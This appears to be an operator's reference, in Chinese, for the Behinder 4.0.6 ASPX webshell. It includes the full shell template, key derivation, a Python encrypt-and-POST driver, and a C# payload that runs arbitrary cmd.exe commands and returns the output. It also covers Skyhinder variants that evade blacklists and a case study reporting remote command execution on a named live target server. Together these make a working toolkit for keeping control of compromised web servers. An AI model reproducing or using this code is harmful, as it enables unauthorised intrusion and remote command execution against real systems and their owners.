# 冰蝎 4.0.6 ASPX 协议参考（含 Skyhinder 对比）

## 服务端模板原文（Behinder_v4.0.6/server/shell.aspx，4.1 同款）

```
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
```

要点：
- 密钥写死在 Session.Add，客户端与马各自从同一密码派生同一密钥 → **无握手**。
- 载荷 = POST 裸二进制密文（BinaryRead），命令/回显全在解密后的程序集 U 里完成。
- `Session[0]` 是 **int 索引取第一个 Session 项**（不是键 "0"）。

## 混淆版特征（2026-08 实测目标 2291_student3.aspx）
- 变量名 `xlpass` + 随机后缀；`\u0045\u006e\u0063\u006f\u0064i\u006e\u0067` 式转义（=Encoding）；
- `/*xlpassXXX*/` 注释插在成员访问中间；常量用 `Convert.FromBase64String("MA==")`（="0"）、`"VQ=="`（="U"）；
- `Session[Convert.ToInt32(Encoding.ASCII.GetString(new byte[1]{(byte)(48)}))]` = `Session[0]`。
- 结构仍是冰蝎 4.0.6 原版，只是变量/字符串被混淆。

## 密钥派生（客户端复刻）
```python
import hashlib
key = hashlib.md5(b"Aa123456").hexdigest()[:16].encode()   # 16 ASCII 字节
# 反例（都错）：.digest() 原始16字节；.hexdigest() 全32位
```
- 默认密码 rebeyond → e45e329feb5d925b
- Aa123456 → afdd0b4ad2ec172c

## Python 驱动（加密 + POST）
```python
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympad

def aes_enc(key: bytes, plain: bytes) -> bytes:
    padder = sympad.PKCS7(128).padder()
    data = padder.update(plain) + padder.finalize()
    c = Cipher(algorithms.AES(key), modes.CBC(key)).encryptor()
    return c.update(data) + c.finalize()

r = requests.post(url + "?cmd=whoami", data=aes_enc(key, dll_bytes),
                  headers={"Content-Type": "application/octet-stream"}, timeout=20)
```

## 载荷程序集 U.cs（csc 编译，纯反射拿 Page.Response，免 System.Web 编译引用）
```csharp
using System;
using System.Diagnostics;
using System.Reflection;

public class U
{
    public override bool Equals(object obj)
    {
        try
        {
            object page = obj;
            object resp = page.GetType().GetProperty("Response").GetValue(page, null);
            MethodInfo write = resp.GetType().GetMethod("Write", new Type[] { typeof(string) });
            object req = page.GetType().GetProperty("Request").GetValue(page, null);
            object qs = req.GetType().GetProperty("QueryString").GetValue(req, null);
            object cmd = qs.GetType().GetMethod("Get", new Type[] { typeof(string) }).Invoke(qs, new object[] { "cmd" });
            string c = cmd == null ? "" : cmd.ToString();
            if (string.IsNullOrEmpty(c)) { write.Invoke(resp, new object[] { "ERR:no cmd" }); return false; }
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + c;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string o = p.StandardOutput.ReadToEnd() + "\n[stderr]\n" + p.StandardError.ReadToEnd();
            p.WaitForExit();
            write.Invoke(resp, new object[] { "<pre>" + o + "</pre>" });
        }
        catch (Exception ex)
        {
            try {
                object resp = obj.GetType().GetProperty("Response").GetValue(obj, null);
                resp.GetType().GetMethod("Write", new Type[] { typeof(string) }).Invoke(resp, new object[] { "EXC: " + ex.ToString() });
            } catch { }
        }
        return false;
    }
    public override int GetHashCode() { return 12345; }
}
```
编译（MSYS 坑：cd 进目录用相对路径，forward-slash 绝对路径会被转坏）：
```
cd "C:/Users/user/AppData/Local/Temp"
"C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe" /nologo /target:library /out:U.dll U.cs
```
程序集类名必须是 `U`（无命名空间），因为马里 `CreateInstance("U")`。

## Skyhinder 系（另一家族，注意区分）
- `api.aspx`：`string key = "900bc885d7553375"; byte[] k = Encoding.Default.GetBytes(key); Session.Add("sky", key);` body 用 `StreamReader(Request.InputStream).ReadLine()` 读**第一行 Base64** → 同款 RijndaelManaged + Assembly.Load + CreateInstance("U").Equals(this.Context)。
- `api_bypass.aspx`：同 key，用 `typeof(Environment).Assembly.CreateInstance("System.Secur"+"ity.Crypto"+"graphy.Rijnda"+"elManaged")` 反射建解密器（绕过黑名单）。
- 与冰蝎区别：密钥硬编码非 MD5 派生、载荷是 Base64 文本行而非裸二进制、参数传 this.Context。

## .NET RijndaelManaged 错误信息真值（本机 csc 实测，中文 locale）
| 场景 | 异常 |
|---|---|
| 空密钥 + 空数据 | 指定的初始化向量(IV)长度与算法密钥大小不匹配 |
| 16B 密钥 + 空数据 | 数据无效无法移除填充（=Padding is invalid，正常） |
| 16B 密钥 + 15B 数据 | 要解密的数据的长度无效（=Length of the data to decrypt is invalid） |
| 16B 密钥 + 16B 全零 | 数据无效无法移除填充 |

注意：错误信息随服务器 locale 变化（中文系统是中文消息，英文系统是英文），判读按语义不按文字。

## 客户端考古（冰蝎 4.0.6 jar，判定"客户端到底发的什么"）
- 本机路径：`D:\Pentest\环境\Behinder\Behinder_v4.0.6\Behinder.jar`（Java 8 + javap 可用）。
- `net/rebeyond/behinder/core/Crypt.class`（javap -p -c 或解析 class 常量池）：默认 `ENCRYPT_TYPE_AES` 路径 = **AES/CBC/PKCS5Padding（IV=密钥）**；另有 AES/ECB/PKCS5Padding 方法（其他类型/native 流）。→ 默认协议与马（CBC+裸二进制）匹配。
- `ShellService.class`：aspx 请求头 **`Content-Type: application/octet-stream`** + 裸二进制 body（`Utils.sendPostRequestBinary(url, map, byte[])`）；php 才用 x-www-form-urlencoded。字段：currentPassword/currentKey/sessionId/updateKey（密钥轮换，仅 BShell 类新协议用）。
- `data.db` 的 **TransProtocol 表 = 各类型加密封装模板**：**id=28 `default_aes`（aspx）= RijndaelManaged **ECB** + `Convert.ToBase64String` 输出**——若冰蝎条目选了该传输协议，与 CBC+裸二进制的马不匹配，必报解密错误。内置协议负 id，用户自定义正 id。
- 各工具 data.db 常见表：冰蝎 shells/shellentity/BShell/TransProtocol/proxys；蚁剑 antData/db.ant + encoders/custom/（空文件=未配自定义编码器）；哥斯拉 shell；Skyhinder webshell（url/type/pass 字段）。
- 冰蝎 proxys 表默认 SOCKS 127.0.0.1:1080/7890——连接错误≠解密错误，先区分。

## 2026-08 实测案例：uscrec 2291_student3.aspx 失联排查
- 症状：冰蝎 4.0.6 连不上，HTTP 500 "Padding is invalid"，密码 Aa123456 未改、马未动、之前正常（隔两天突然坏）。
- 排查链：GET 错误页=马活着 → 家族识别=冰蝎 4.0.6 混淆版 → 密钥=afdd0b4ad2ec172c → 15B oracle 确认密钥长度有效 → **错误地用"补零密钥 Aa12345600000000"测 80B/4624B，得出"4KB 截断"假结论** → 改用正确密钥 + U.dll 直接 RCE（whoami=win8167\uscrec-001）→ 排除截断/多 worker（单 A 记录 208.98.35.167、三次 GET 源码一致、同一密文三次结果稳定）→ 结论：**服务器端完好，冰蝎条目配置（传输协议/密码/URL）与标准协议不一致**。
- 核心教训：**先用正确密钥+真实载荷把服务器端钉死，再怀疑客户端**；小明文×错密钥的 PKCS7 巧合会伪造"解密成功"信号（见 SKILL.md 第 5 节）。
- 旁证：响应体固定前缀 `Welcome You!<html></html>{;}`（混淆马自带的伪装文本），U.dll 输出跟在后面，解析时按 `<pre>` 切。
